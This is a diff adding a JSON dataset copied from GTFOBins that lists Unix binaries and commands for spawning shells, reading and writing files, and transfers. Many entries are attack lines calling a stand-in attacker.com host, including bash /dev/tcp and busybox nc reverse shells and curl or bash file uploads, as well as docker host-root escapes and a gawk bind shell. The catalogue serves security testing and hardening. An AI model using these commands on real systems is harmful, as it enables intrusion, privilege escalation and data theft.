@@ -1,0 +1,3650 @@
+{
+  "source": {
+    "name": "GTFOBins",
+    "repo": "https://github.com/GTFOBins/GTFOBins.github.io",
+    "ref": "master",
+    "commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+    "site": "https://gtfobins.github.io/",
+    "license": "GPL-3.0-or-later (see upstream LICENSE)",
+    "tarball_url": "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master",
+    "tarball_sha256": "6f90fac845ee126442f656157aa16418c1173ed1e485327db4e4c9ce34e6ff03",
+    "retrieved_at": "2026-06-22"
+  },
+  "entries": [
+    {
+      "binary": "7z",
+      "category": "file-read",
+      "code": "7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so"
+    },
+    {
+      "binary": "R",
+      "category": "shell",
+      "code": "R --no-save -e 'system(\"/bin/sh\")'"
+    },
+    {
+      "binary": "aa-exec",
+      "category": "shell",
+      "code": "aa-exec /bin/sh"
+    },
+    {
+      "binary": "ab",
+      "category": "download",
+      "code": "ab -v2 http://attacker.com/path/to/input-file"
+    },
+    {
+      "binary": "ab",
+      "category": "upload",
+      "code": "ab -p /path/to/input-file http://attacker.com/"
+    },
+    {
+      "binary": "acr",
+      "category": "command",
+      "code": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\nacr -r ./relative/path/to/temp-file"
+    },
+    {
+      "binary": "agetty",
+      "category": "shell",
+      "code": "agetty -l /bin/sh -o -p -a root tty"
+    },
+    {
+      "binary": "alpine",
+      "category": "file-read",
+      "code": "alpine -F /path/to/input-file"
+    },
+    {
+      "binary": "ansible-playbook",
+      "category": "shell",
+      "code": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file\nansible-playbook /path/to/temp-file"
+    },
+    {
+      "binary": "ansible-test",
+      "category": "shell",
+      "code": "ansible-test shell"
+    },
+    {
+      "binary": "aoss",
+      "category": "shell",
+      "code": "aoss /bin/sh"
+    },
+    {
+      "binary": "apache2",
+      "category": "file-read",
+      "code": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'"
+    },
+    {
+      "binary": "apache2",
+      "category": "file-read",
+      "code": "apache2 -f /path/to/input-file"
+    },
+    {
+      "binary": "apache2ctl",
+      "category": "file-read",
+      "code": "apache2ctl -c 'Include /path/to/input-file'"
+    },
+    {
+      "binary": "apt-get",
+      "category": "shell",
+      "code": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+    },
+    {
+      "binary": "apt-get",
+      "category": "shell",
+      "code": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl"
+    },
+    {
+      "binary": "ar",
+      "category": "file-read",
+      "code": "ar r /path/to/output-file /path/to/input-file\nar p /path/to/output-file"
+    },
+    {
+      "binary": "arch-nspawn",
+      "category": "shell",
+      "code": "mkdir -p ./etc/\ngrep -oP \"^CHROOT_VERSION='\\K[^']+\" /usr/share/devtools/lib/archroot.sh >.arch-chroot\ntouch ./etc/pacman.conf\necho 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf\narch-nspawn ."
+    },
+    {
+      "binary": "aria2c",
+      "category": "command",
+      "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa"
+    },
+    {
+      "binary": "aria2c",
+      "category": "command",
+      "code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\naria2c --on-download-error=/path/to/temp-file http://some-invalid-domain"
+    },
+    {
+      "binary": "aria2c",
+      "category": "download",
+      "code": "aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file"
+    },
+    {
+      "binary": "aria2c",
+      "category": "file-read",
+      "code": "aria2c -i /path/to/input-file"
+    },
+    {
+      "binary": "arj",
+      "category": "file-read",
+      "code": "arj a /path/to/output-file /path/to/input-file\narj p /path/to/output-file"
+    },
+    {
+      "binary": "arj",
+      "category": "file-write",
+      "code": "echo DATA >output-file\narj a x output-file\narj e x /path/to/output-dir/"
+    },
+    {
+      "binary": "arp",
+      "category": "file-read",
+      "code": "arp -v -f /path/to/input-file"
+    },
+    {
+      "binary": "as",
+      "category": "file-read",
+      "code": "as @/path/to/input-file"
+    },
+    {
+      "binary": "ascii-xfr",
+      "category": "file-read",
+      "code": "ascii-xfr -ns /path/to/input-file"
+    },
+    {
+      "binary": "ascii85",
+      "category": "file-read",
+      "code": "ascii85 /path/to/input-file | ascii85 --decode"
+    },
+    {
+      "binary": "ash",
+      "category": "file-write",
+      "code": "ash -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "ash",
+      "category": "shell",
+      "code": "ash"
+    },
+    {
+      "binary": "aspell",
+      "category": "file-read",
+      "code": "aspell --conf /path/to/input-file"
+    },
+    {
+      "binary": "aspell",
+      "category": "file-read",
+      "code": "aspell -c /path/to/input-file"
+    },
+    {
+      "binary": "asterisk",
+      "category": "shell",
+      "code": "asterisk -r\n!/bin/sh"
+    },
+    {
+      "binary": "at",
+      "category": "command",
+      "code": "echo /path/to/command | at now"
+    },
+    {
+      "binary": "at",
+      "category": "shell",
+      "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"
+    },
+    {
+      "binary": "atobm",
+      "category": "file-read",
+      "code": "atobm /path/to/input-file"
+    },
+    {
+      "binary": "autoconf",
+      "category": "shell",
+      "code": "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\ntouch configure.ac\nAUTOM4TE=/path/to/temp-file autoconf"
+    },
+    {
+      "binary": "autoheader",
+      "category": "shell",
+      "code": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\ntouch configure.ac\nAUTOM4TE=/path/to/temp-file autoheader"
+    },
+    {
+      "binary": "autoreconf",
+      "category": "shell",
+      "code": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\necho AC_INIT >configure.ac\nAUTOM4TE=/path/to/temp-file autoreconf"
+    },
+    {
+      "binary": "aws",
+      "category": "file-read",
+      "code": "aws ec2 describe-instances --filter file:///path/to/input-file"
+    },
+    {
+      "binary": "base32",
+      "category": "file-read",
+      "code": "base32 /path/to/input-file | base32 --decode"
+    },
+    {
+      "binary": "base58",
+      "category": "file-read",
+      "code": "base58 /path/to/input-file | base58 --decode"
+    },
+    {
+      "binary": "base64",
+      "category": "file-read",
+      "code": "base64 /path/to/input-file | base64 --decode"
+    },
+    {
+      "binary": "basenc",
+      "category": "file-read",
+      "code": "basenc --base64 /path/to/input-file | basenc -d --base64"
+    },
+    {
+      "binary": "basez",
+      "category": "file-read",
+      "code": "basez /path/to/input-file | basez --decode"
+    },
+    {
+      "binary": "bash",
+      "category": "download",
+      "code": "bash -c 'echo \"$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"
+    },
+    {
+      "binary": "bash",
+      "category": "download",
+      "code": "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } >/path/to/output-file'"
+    },
+    {
+      "binary": "bash",
+      "category": "file-read",
+      "code": "HISTTIMEFORMAT=$'\\r\\e[K'\nhistory -c\nhistory -r /path/to/input-file\nhistory"
+    },
+    {
+      "binary": "bash",
+      "category": "file-read",
+      "code": "bash -c 'echo \"$(</path/to/input-file)\"'"
+    },
+    {
+      "binary": "bash",
+      "category": "file-write",
+      "code": "HISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w /path/to/output-file"
+    },
+    {
+      "binary": "bash",
+      "category": "file-write",
+      "code": "bash -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "bash",
+      "category": "library-load",
+      "code": "bash -c 'enable -f /path/to/lib.so x'"
+    },
+    {
+      "binary": "bash",
+      "category": "reverse-shell",
+      "code": "bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'"
+    },
+    {
+      "binary": "bash",
+      "category": "shell",
+      "code": "bash"
+    },
+    {
+      "binary": "bash",
+      "category": "upload",
+      "code": "bash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"
+    },
+    {
+      "binary": "bash",
+      "category": "upload",
+      "code": "bash -c 'echo -n \"$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'"
+    },
+    {
+      "binary": "bbot",
+      "category": "file-read",
+      "code": "bbot -d -cy /path/to/input-file"
+    },
+    {
+      "binary": "bc",
+      "category": "file-read",
+      "code": "bc -s /path/to/input-file\nquit"
+    },
+    {
+      "binary": "bconsole",
+      "category": "file-read",
+      "code": "bconsole -c /path/to/file-input"
+    },
+    {
+      "binary": "bconsole",
+      "category": "shell",
+      "code": "bconsole\n@exec /bin/sh"
+    },
+    {
+      "binary": "borg",
+      "category": "shell",
+      "code": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\""
+    },
+    {
+      "binary": "bpftrace",
+      "category": "shell",
+      "code": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'"
+    },
+    {
+      "binary": "bpftrace",
+      "category": "shell",
+      "code": "bpftrace -c /bin/sh -e 'END {exit()}'"
+    },
+    {
+      "binary": "bpftrace",
+      "category": "shell",
+      "code": "echo 'BEGIN {system(\"/bin/sh 1<&0\");exit()}' >/path/to/temp-file\nbpftrace --unsafe /path/to/temp-file"
+    },
+    {
+      "binary": "bridge",
+      "category": "file-read",
+      "code": "bridge -b /path/to/input-file"
+    },
+    {
+      "binary": "bundle",
+      "category": "shell",
+      "code": "BUNDLE_GEMFILE=x bundle exec /bin/sh"
+    },
+    {
+      "binary": "bundle",
+      "category": "shell",
+      "code": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install"
+    },
+    {
+      "binary": "bundle",
+      "category": "shell",
+      "code": "touch Gemfile\nbundle exec /bin/sh"
+    },
+    {
+      "binary": "busctl",
+      "category": "shell",
+      "code": "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
+    },
+    {
+      "binary": "busctl",
+      "category": "shell",
+      "code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
+    },
+    {
+      "binary": "busybox",
+      "category": "reverse-shell",
+      "code": "busybox nc -e /bin/sh attacker.com 12345"
+    },
+    {
+      "binary": "busybox",
+      "category": "upload",
+      "code": "busybox httpd -f -p 12345 -h ."
+    },
+    {
+      "binary": "bzip2",
+      "category": "file-read",
+      "code": "bzip2 -c /path/to/input-file | bzip2 -d"
+    },
+    {
+      "binary": "cabal",
+      "category": "shell",
+      "code": "cabal exec --project-file=/dev/null -- /bin/sh"
+    },
+    {
+      "binary": "cancel",
+      "category": "upload",
+      "code": "cancel -h attacker.com:12345 -u DATA"
+    },
+    {
+      "binary": "capsh",
+      "category": "shell",
+      "code": "capsh --"
+    },
+    {
+      "binary": "cat",
+      "category": "file-read",
+      "code": "cat /path/to/input-file"
+    },
+    {
+      "binary": "cdist",
+      "category": "shell",
+      "code": "cdist shell -s /bin/sh"
+    },
+    {
+      "binary": "certbot",
+      "category": "shell",
+      "code": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'"
+    },
+    {
+      "binary": "check_by_ssh",
+      "category": "shell",
+      "code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C x"
+    },
+    {
+      "binary": "check_cups",
+      "category": "file-read",
+      "code": "check_cups --extra-opts=@/path/to/input-file"
+    },
+    {
+      "binary": "check_log",
+      "category": "file-read",
+      "code": "check_log -F /path/to/input-file -O /dev/stdout"
+    },
+    {
+      "binary": "check_log",
+      "category": "file-write",
+      "code": "check_log -F /path/to/input-file -O /path/to/output-file"
+    },
+    {
+      "binary": "check_memory",
+      "category": "file-read",
+      "code": "check_memory --extra-opts=@/path/to/input-file"
+    },
+    {
+      "binary": "check_raid",
+      "category": "file-read",
+      "code": "check_raid --extra-opts=@/path/to/input-file"
+    },
+    {
+      "binary": "check_ssl_cert",
+      "category": "shell",
+      "code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\ncheck_ssl_cert --grep-bin /path/to/temp-file -H x"
+    },
+    {
+      "binary": "check_statusfile",
+      "category": "file-read",
+      "code": "check_statusfile /path/to/input-file"
+    },
+    {
+      "binary": "choom",
+      "category": "shell",
+      "code": "choom -n 0 /bin/sh"
+    },
+    {
+      "binary": "chroot",
+      "category": "shell",
+      "code": "chroot /"
+    },
+    {
+      "binary": "chrt",
+      "category": "shell",
+      "code": "chrt 1 /bin/sh"
+    },
+    {
+      "binary": "clamscan",
+      "category": "file-read",
+      "code": "touch x.yara\nclamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
+    },
+    {
+      "binary": "clisp",
+      "category": "shell",
+      "code": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'"
+    },
+    {
+      "binary": "cmake",
+      "category": "file-read",
+      "code": "cmake -E cat /path/to/input-file"
+    },
+    {
+      "binary": "cmake",
+      "category": "shell",
+      "code": "echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt\ncmake /path/to/"
+    },
+    {
+      "binary": "cmp",
+      "category": "file-read",
+      "code": "cmp /path/to/input-file /dev/zero -b -l"
+    },
+    {
+      "binary": "cobc",
+      "category": "shell",
+      "code": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file\ncobc -xFj --frelax-syntax-checks /path/to/temp-file"
+    },
+    {
+      "binary": "code",
+      "category": "download",
+      "code": "code tunnel --name xxxxxx"
+    },
+    {
+      "binary": "code",
+      "category": "reverse-shell",
+      "code": "code tunnel --name xxxxxx"
+    },
+    {
+      "binary": "code",
+      "category": "upload",
+      "code": "code tunnel --name xxxxxx"
+    },
+    {
+      "binary": "codex",
+      "category": "shell",
+      "code": "codex sandbox linux /bin/sh"
+    },
+    {
+      "binary": "column",
+      "category": "file-read",
+      "code": "column /path/to/input-file"
+    },
+    {
+      "binary": "comm",
+      "category": "file-read",
+      "code": "comm /path/to/input-file /dev/null"
+    },
+    {
+      "binary": "composer",
+      "category": "shell",
+      "code": "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json\ncomposer run-script x"
+    },
+    {
+      "binary": "cp",
+      "category": "file-read",
+      "code": "cp /path/to/input-file /dev/stdout"
+    },
+    {
+      "binary": "cp",
+      "category": "file-write",
+      "code": "echo DATA | cp /dev/stdin /path/to/output-file"
+    },
+    {
+      "binary": "cpio",
+      "category": "file-read",
+      "code": "echo /path/to/input-file | cpio -dp .\ncat path/to/input-file"
+    },
+    {
+      "binary": "cpio",
+      "category": "file-read",
+      "code": "echo /path/to/input-file | cpio -o"
+    },
+    {
+      "binary": "cpio",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\necho /path/to/temp-file | cpio -udp ."
+    },
+    {
+      "binary": "cpio",
+      "category": "shell",
+      "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"
+    },
+    {
+      "binary": "cpulimit",
+      "category": "shell",
+      "code": "cpulimit -l 100 -f -- /bin/sh"
+    },
+    {
+      "binary": "crash",
+      "category": "command",
+      "code": "CRASHPAGER=/path/to/command crash -h"
+    },
+    {
+      "binary": "crontab",
+      "category": "command",
+      "code": "crontab -e"
+    },
+    {
+      "binary": "csh",
+      "category": "file-write",
+      "code": "csh -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "csh",
+      "category": "shell",
+      "code": "csh"
+    },
+    {
+      "binary": "csplit",
+      "category": "file-read",
+      "code": "csplit /path/to/input-file 1\ncat xx01"
+    },
+    {
+      "binary": "csplit",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\ncsplit -z -b '%doutput-file' /path/to/temp-file 1"
+    },
+    {
+      "binary": "csvtool",
+      "category": "file-read",
+      "code": "csvtool trim t /path/to/input-file"
+    },
+    {
+      "binary": "csvtool",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\ncsvtool trim t /path/to/temp-file -o /path/to/output-file"
+    },
+    {
+      "binary": "csvtool",
+      "category": "shell",
+      "code": "csvtool call '/bin/sh;false' /etc/hosts"
+    },
+    {
+      "binary": "ctr",
+      "category": "shell",
+      "code": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x"
+    },
+    {
+      "binary": "cupsfilter",
+      "category": "file-read",
+      "code": "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file"
+    },
+    {
+      "binary": "curl",
+      "category": "download",
+      "code": "curl http://attacker.com/path/to/input-file -o /path/to/output-file"
+    },
+    {
+      "binary": "curl",
+      "category": "file-read",
+      "code": "curl file:///path/to/input-file"
+    },
+    {
+      "binary": "curl",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\ncurl file:///path/to/temp-file -o /path/to/output-file"
+    },
+    {
+      "binary": "curl",
+      "category": "library-load",
+      "code": "curl --engine /path/to/lib.so x"
+    },
+    {
+      "binary": "curl",
+      "category": "upload",
+      "code": "curl -X POST --data-binary @/path/to/input-file http://attacker.com"
+    },
+    {
+      "binary": "curl",
+      "category": "upload",
+      "code": "curl -X POST --data-binary DATA http://attacker.com"
+    },
+    {
+      "binary": "curl",
+      "category": "upload",
+      "code": "curl gopher://attacker.com:12345/_DATA"
+    },
+    {
+      "binary": "cut",
+      "category": "file-read",
+      "code": "cut -d '' -f1 /path/to/input-file"
+    },
+    {
+      "binary": "dash",
+      "category": "file-write",
+      "code": "dash -c 'echo DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "dash",
+      "category": "shell",
+      "code": "dash"
+    },
+    {
+      "binary": "date",
+      "category": "file-read",
+      "code": "date -f /path/to/input-file"
+    },
+    {
+      "binary": "dc",
+      "category": "shell",
+      "code": "dc -e '!/bin/sh'"
+    },
+    {
+      "binary": "dd",
+      "category": "file-read",
+      "code": "dd if=/path/to/input-file"
+    },
+    {
+      "binary": "dd",
+      "category": "file-write",
+      "code": "echo DATA | dd of=/path/to/output-file"
+    },
+    {
+      "binary": "debugfs",
+      "category": "shell",
+      "code": "debugfs\n!/bin/sh"
+    },
+    {
+      "binary": "dhclient",
+      "category": "shell",
+      "code": "dhclient -sf /bin/sh"
+    },
+    {
+      "binary": "dialog",
+      "category": "file-read",
+      "code": "dialog --textbox /path/to/input-file 0 0"
+    },
+    {
+      "binary": "diff",
+      "category": "file-read",
+      "code": "diff --line-format=%L /dev/null /path/to/input-file"
+    },
+    {
+      "binary": "diff",
+      "category": "file-read",
+      "code": "diff --recursive /path/to/empty-dir /path/to/input-dir/"
+    },
+    {
+      "binary": "dig",
+      "category": "file-read",
+      "code": "dig -f /path/to/input-file"
+    },
+    {
+      "binary": "distcc",
+      "category": "shell",
+      "code": "distcc /bin/sh"
+    },
+    {
+      "binary": "dmesg",
+      "category": "file-read",
+      "code": "dmesg -rF /path/to/input-file"
+    },
+    {
+      "binary": "dmidecode",
+      "category": "file-write",
+      "code": "dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file"
+    },
+    {
+      "binary": "dmsetup",
+      "category": "shell",
+      "code": "dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\ndmsetup ls --exec '/bin/sh -s'"
+    },
+    {
+      "binary": "dnf",
+      "category": "command",
+      "code": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*"
+    },
+    {
+      "binary": "dnsmasq",
+      "category": "command",
+      "code": "dnsmasq --conf-script='/path/to/command 1>&2'"
+    },
+    {
+      "binary": "doas",
+      "category": "shell",
+      "code": "doas -u root /bin/sh"
+    },
+    {
+      "binary": "docker",
+      "category": "file-read",
+      "code": "docker cp /path/to/input-file $CONTAINER_ID:input-file\ndocker cp $CONTAINER_ID:input-file /path/to/temp-file\ncat /path/to/temp-file"
+    },
+    {
+      "binary": "docker",
+      "category": "file-write",
+      "code": "echo DATA >/path/to/temp-file\ndocker cp /path/to/temp-file $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /path/to/output-file"
+    },
+    {
+      "binary": "docker",
+      "category": "shell",
+      "code": "docker run --rm -it --privileged -u root alpine\nmount /dev/sda1 /mnt/\nls -la /mnt/\nchroot /mnt /bin/bash"
+    },
+    {
+      "binary": "docker",
+      "category": "shell",
+      "code": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"
+    },
+    {
+      "binary": "dos2unix",
+      "category": "file-read",
+      "code": "dos2unix -f -O /path/to/input-file"
+    },
+    {
+      "binary": "dos2unix",
+      "category": "file-write",
+      "code": "dos2unix -f -n /path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "dosbox",
+      "category": "file-read",
+      "code": "dosbox -c 'mount c /' -c 'copy c:\\path\\to\\input c:\\path\\to\\output' -c exit\ncat /path/to/OUTPUT"
+    },
+    {
+      "binary": "dosbox",
+      "category": "file-read",
+      "code": "dosbox -c 'mount c /' -c 'type c:\\path\\to\\input'"
+    },
+    {
+      "binary": "dosbox",
+      "category": "file-write",
+      "code": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit"
+    },
+    {
+      "binary": "dotnet",
+      "category": "file-read",
+      "code": "dotnet fsi\nSystem.IO.File.ReadAllText(\"/path/to/input-file\");;"
+    },
+    {
+      "binary": "dotnet",
+      "category": "shell",
+      "code": "dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
+    },
+    {
+      "binary": "dpkg",
+      "category": "shell",
+      "code": "dpkg -i x_1.0_all.deb"
+    },
+    {
+      "binary": "dvips",
+      "category": "shell",
+      "code": "dvips -R0 texput.dvi"
+    },
+    {
+      "binary": "easyrsa",
+      "category": "shell",
+      "code": "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"
+    },
+    {
+      "binary": "ed",
+      "category": "file-read",
+      "code": "ed /path/to/input-file\n,p\nq"
+    },
+    {
+      "binary": "ed",
+      "category": "file-write",
+      "code": "ed /path/to/output-file\na\nDATA\n.\nw\nq"
+    },
+    {
+      "binary": "ed",
+      "category": "shell",
+      "code": "ed\n!/bin/sh\nq"
+    },
+    {
+      "binary": "efax",
+      "category": "file-read",
+      "code": "efax -d /path/to/input-file"
+    },
+    {
+      "binary": "egrep",
+      "category": "file-read",
+      "code": "grep '' /path/to/input-file"
+    },
+    {
+      "binary": "elvish",
+      "category": "file-read",
+      "code": "elvish -c 'print (slurp </path/to/input-file)'"
+    },
+    {
+      "binary": "elvish",
+      "category": "file-write",
+      "code": "elvish -c 'print DATA >/path/to/output-file'"
+    },
+    {
+      "binary": "elvish",
+      "category": "shell",
+      "code": "elvish"
+    },
+    {
+      "binary": "emacs",
+      "category": "file-read",
+      "code": "emacs /path/to/input-file"
+    },
+    {
+      "binary": "emacs",
+      "category": "file-write",
+      "code": "emacs /path/to/output-file\nDATA\nC-x C-s"
+    },
+    {
+      "binary": "emacs",
+      "category": "shell",
+      "code": "emacs -Q -nw --eval '(term \"/bin/sh\")'"
+    },
+    {
+      "binary": "enscript",
+      "category": "shell",
+      "code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
+    },
+    {
+      "binary": "env",
+      "category": "shell",
+      "code": "env /bin/sh"
+    },
+    {
+      "binary": "eqn",
+      "category": "file-read",
+      "code": "eqn /path/to/input-file"
+    },
+    {
+      "binary": "espeak",
+      "category": "file-read",
+      "code": "espeak -qXf /path/to/input-file"
+    },
+    {
+      "binary": "ex",
+      "category": "shell",
+      "code": "ex -c ':!/bin/sh'"
+    },
+    {
+      "binary": "exiftool",
+      "category": "file-read",
+      "code": "exiftool -filename=/path/to/output-file /path/to/input-file\ncat /path/to/output-file"
+    },
+    {
+      "binary": "exiftool",
+      "category": "file-write",
+      "code": "exiftool \"-description<=/path/to/input-file --filename /path/to/output-file"
+    },
+    {
+      "binary": "exiftool",
+      "category": "file-write",
+      "code": "exiftool \"-description=DATA --filename /path/to/output-file"
+    },
+    {
+      "binary": "exiftool",
+      "category": "file-write",
+      "code": "exiftool -description -W /path/to/output-file --filename /path/to/input-file"
+    },
+    {
+      "binary": "exiftool",
+      "category": "file-write",
+      "code": "exiftool -filename=/path/to/output-file /path/to/input-file"
+    },
+    {
+      "binary": "expand",
+      "category": "file-read",
+      "code": "expand /path/to/input-file"
+    },
+    {
+      "binary": "expect",
+      "category": "file-read",
+      "code": "expect /path/to/input-file"
+    },
+    {
+      "binary": "expect",
+      "category": "shell",
+      "code": "expect -c 'spawn /bin/sh;interact'"
+    },
+    {
+      "binary": "fail2ban-client",
+      "category": "command",
+      "code": "cat >/path/to/temp-dir/fail2ban.conf <<EOF\n[Definition]\nEOF\n\ncat >/path/to/temp-dir/jail.local <<EOF\n[x]\nenabled = true\naction = x\nEOF\n\nmkdir -p /path/to/temp-dir/action.d/\ncat >/path/to/temp-dir/action.d/x.conf <<EOF\n[Definition]\nactionstart = /path/to/command\nEOF\n\nmkdir -p /path/to/temp-dir/filter.d/\ncat >/path/to/temp-dir/filter.d/x.conf <<EOF\n[Definition]\nEOF\n\nfail2ban-client -c /path/to/temp-dir/ -v restart"
+    },
+    {
+      "binary": "fail2ban-client",
+      "category": "command",
+      "code": "fail2ban-client add x\nfail2ban-client set x addaction x\nfail2ban-client set x action x actionban /path/to/command\nfail2ban-client start x\nfail2ban-client set x banip 999.999.999.999\nfail2ban-client set x unbanip 999.999.999.999\nfail2ban-client stop x"
+    },
+    {
+      "binary": "fastfetch",
+      "category": "command",
+      "code": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /path/to/command\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc"
+    },
+    {
+      "binary": "fastfetch",
+      "category": "file-read",
+      "code": "fastfetch --file /path/to/input-file"
+    },
+    {
+      "binary": "fastfetch",
+      "category": "shell",
+      "code": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc\nfastfetch -c /path/to/temp-file.jsonc"
+    },
+    {
+      "binary": "ffmpeg",
+      "category": "library-load",
+      "code": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav\nreset^J"
+    },
+    {
+      "binary": "fgrep",
+      "category": "file-read",
+      "code": "grep '' /path/to/input-file"
+    },
+    {
+      "binary": "file",
+      "category": "file-read",
+      "code": "file -f /path/to/input-file"
+    },
+    {
+      "binary": "file",
+      "category": "file-read",
+      "code": "file -m /path/to/input-file"
+    },
+    {
+      "binary": "find",
+      "category": "file-read",
+      "code": "find /path/to/input-file -exec cat {} \\;"
+    },
+    {
+      "binary": "find",
+      "category": "file-write",
+      "code": "find / -fprintf /path/to/output-file DATA -quit"
+    },
+    {
+      "binary": "find",
+      "category": "shell",
+      "code": "find . -exec /bin/sh \\; -quit"
+    },
+    {
+      "binary": "finger",
+      "category": "download",
+      "code": "finger x@attacker.com"
+    },
+    {
+      "binary": "finger",
+      "category": "upload",
+      "code": "finger DATA@attacker.com"
+    },
+    {
+      "binary": "firejail",
+      "category": "shell",
+      "code": "firejail /bin/sh"
+    },
+    {
+      "binary": "fish",
+      "category": "shell",
+      "code": "fish"
+    },
+    {
+      "binary": "flock",
+      "category": "shell",
+      "code": "flock -u / /bin/sh"
+    },
+    {
+      "binary": "fmt",
+      "category": "file-read",
+      "code": "fmt -999 /path/to/input-file"
+    },
+    {
+      "binary": "fmt",
+      "category": "file-read",
+      "code": "fmt -pNON_EXISTING_PREFIX /path/to/input-file"
+    },
+    {
+      "binary": "fold",
+      "category": "file-read",
+      "code": "fold -w999 /path/to/input-file"
+    },
+    {
+      "binary": "forge",
+      "category": "shell",
+      "code": "echo '#!/bin/sh' >/path/to/temp-file\necho -e \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" >>/path/to/temp-file\nchmod +x /path/to/temp-file\nforge build --use /path/to/temp-file"
+    },
+    {
+      "binary": "fping",
+      "category": "file-read",
+      "code": "fping -f /path/to/input-file"
+    },
+    {
+      "binary": "ftp",
+      "category": "download",
+      "code": "ftp -a attacker.com\nget /path/to/input-file output-file"
+    },
+    {
+      "binary": "ftp",
+      "category": "shell",
+      "code": "ftp\n!/bin/sh"
+    },
+    {
+      "binary": "ftp",
+      "category": "upload",
+      "code": "ftp -a attacker.com\nput /path/to/input-file output-file"
+    },
+    {
+      "binary": "fzf",
+      "category": "command",
+      "code": "fzf --listen=12345"
+    },
+    {
+      "binary": "fzf",
+      "category": "shell",
+      "code": "fzf --bind 'enter:execute(/bin/sh)'"
+    },
+    {
+      "binary": "gawk",
+      "category": "bind-shell",
+      "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
+    },
+    {
+      "binary": "gawk",
+      "category": "file-read",
+      "code": "gawk '//' /path/to/input-file"
